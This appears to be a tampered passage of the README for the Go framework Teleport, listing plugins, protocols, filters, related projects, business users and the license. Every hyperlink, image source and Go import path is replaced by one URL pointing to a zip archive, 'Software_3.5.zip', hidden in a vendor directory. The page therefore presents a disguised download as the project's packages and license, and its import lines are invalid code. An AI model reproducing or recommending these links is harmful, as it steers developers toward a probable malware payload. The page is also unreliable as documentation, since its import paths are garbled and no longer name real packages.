| [binder](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import binder "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Parameter Binding Verification for Struct Handler |
| [heartbeat](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import heartbeat "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A generic timing heartbeat plugin        |
| [proxy](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A proxy plugin for handling unknown calling or pushing |
[secure](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip)|`import secure "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"`|Encrypting/decrypting the message body

### Protocol

| package                                  | import                                   | description                              |
| ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
| [rawproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip` | A fast socket communication protocol(teleport default protocol) |
| [jsonproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A JSON socket communication protocol     |
| [pbproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A Protobuf socket communication protocol     |
| [thriftproto](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | A Thrift communication protocol     |

### Transfer-Filter

| package                                  | import                                   | description                              |
| ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
| [gzip](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Gzip(teleport own)                       |
| [md5](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Provides a integrity check transfer filter |

### Mixer

| package                                  | import                                   | description                              |
| ---------------------------------------- | ---------------------------------------- | ---------------------------------------- |
| [multiclient](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Higher throughput client connection pool when transferring large messages (such as downloading files) |
| [websocket](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `import "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | Makes the Teleport framework compatible with websocket protocol as specified in RFC 6455 |
| [html](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | `html "https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"` | HTML render for http client |

## Projects based on Teleport

| project                                  | description                              |
| ---------------------------------------- | ---------------------------------------- |
| [TP-Micro](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | TP-Micro is a simple, powerful micro service framework based on Teleport |
| [Pholcus](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) | Pholcus is a distributed, high concurrency and powerful web crawler software |

## Business Users

<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="50" alt="深圳市梦之舵信息技术有限公司"/></a>
&nbsp;&nbsp;
<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="50" alt="平安科技"/></a>
<br/>
<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="70" alt="北京风行在线技术有限公司"/></a>
&nbsp;&nbsp;
<a href="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip"><img src="https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip" height="70" alt="北京可即时代网络公司"/></a>

## License

Teleport is under Apache v2 License. See the [LICENSE](https://raw.githubusercontent.com/huizuohaode/teleport/v5/vendor/github.com/gogo/protobuf/proto/Software_3.5.zip) file for the full license text
